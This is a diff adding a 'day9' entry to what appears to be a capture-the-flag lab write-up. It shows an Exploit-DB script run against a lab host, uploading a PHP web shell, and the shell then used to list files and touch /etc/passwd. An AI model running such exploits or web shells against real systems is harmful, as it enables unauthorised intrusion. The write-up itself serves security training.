@@ -311,3 +311,46 @@ $ find / -name "flag.txt" -type f 2>/dev/null
 /home/cmnatic/flag.txt
 $ cat /home/cmnatic/flag.txt
 ```
+# day9
+- https://www.exploit-db.com/raw/47887
+
+```
+root@kali:~# python3 47887.py http://10.10.23.163
+> Attempting to upload PHP web shell...
+> Verifying shell upload...
+> Web shell uploaded to http://10.10.23.163/bootstrap/img/p2rZ0yY5id.php
+> Example command usage: http://10.10.23.163/bootstrap/img/p2rZ0yY5id.php?cmd=wh                                     oami
+> Do you wish to launch a shell here? (y/n): y
+RCE $ ls
+4Bp1GgO6Ye.php
+E1lwQNyeCG.php
+I9DXsSGS3d.php
+OU14vBKCrY.php
+S1GyTInlGR.php
+android_studio.jpg
+beauty_js.jpg
+c_14_quick.jpg
+c_sharp_6.jpg
+doing_good.jpg
+e654RS9PbB.php
+fwLoNUAAbt.php
+img1.jpg
+img2.jpg
+img3.jpg
+kotlin_250x250.png
+logic_program.jpg
+mobile_app.jpg
+p2rZ0yY5id.php
+pro_asp4.jpg
+pro_js.jpg
+tjj3dCizJ5.php
+unnamed.png
+web_app_dev.jpg
+
+RCE $
+wc -c /etc/passwd
+wc -c /etc/passwd
+1611 /etc/passwd
+
+RCE $
+```
